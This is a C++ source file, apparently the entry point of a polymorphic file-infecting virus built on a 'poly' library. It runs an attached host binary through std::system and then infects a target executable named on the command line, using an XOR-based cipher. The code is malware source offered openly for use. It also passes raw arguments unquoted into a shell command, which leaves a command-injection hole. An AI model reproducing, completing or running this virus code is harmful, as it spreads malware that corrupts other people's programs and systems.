#include <cstdlib>

#include <iostream>

#include <poly/host_properties.hpp>
#include <poly/virus.hpp>

// Assumo che il valore restituito rappresenti un path valido che punti a un
// file
struct TargetSelectPolicy {
    poly::fs::path next_target(poly::fs::path) noexcept { return {}; }
};

struct BlockingExec {
    BlockingExec() noexcept : result_{0} {};

    void exec(const poly::fs::path &program, int argc, char **const argv,
              char **const envp) noexcept {
        std::string cmd = program.string();

        for (auto i = 2; i < argc; i++) {
            cmd += " " + std::string(argv[i]);
        }

        this->result_ = std::system(cmd.c_str());
#ifndef POLY_WINDOWS
        this->result_ = WEXITSTATUS(this->result_);
#endif
    }

    inline void wait() noexcept { return; }

    inline int get_result() const noexcept { return this->result_; }

  private:
    int result_;
};

using Cipher = poly::Cipher<
    poly::CipherMode::kCBC,
    poly::EncryptionAlgorithm<poly::EncryptionAlgorithmType::kXor>>;

int main(int argc, char **argv, char **envp) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <target_path> [<args..>]\n";
        std::cerr << "Required:\n";
        std::cerr << "\ttarget_path: this represents the path where the binary "
                     "to infect is placed. If is empty it will be ignored.\n";
        std::cerr << "\nOptional:\n";
        std::cerr
            << "\targs..: other arguments which will be passed to the attached "
               "binary, if present.\n";

        return 1;
    }

    auto virus = poly::Virus<TargetSelectPolicy, BlockingExec, Cipher>::build(
        argc, argv, envp);

    if (virus == nullptr) {
        return 1;
    }

    auto res = virus->exec_attached_program();
    bool has_attached_bin = res == poly::Error::kNone;

    if (res != poly::Error::kNone && res != poly::Error::kNoTargetAttached) {
        return 1;
    }

    if (!std::string(argv[1]).empty() &&
        virus->infect_next(argv[1]) != poly::Error::kNone) {
        return 1;
    }
    virus->wait_exec_end();

    if (has_attached_bin) {
        return virus->exec_result();
    } else {
        return 0;
    }
}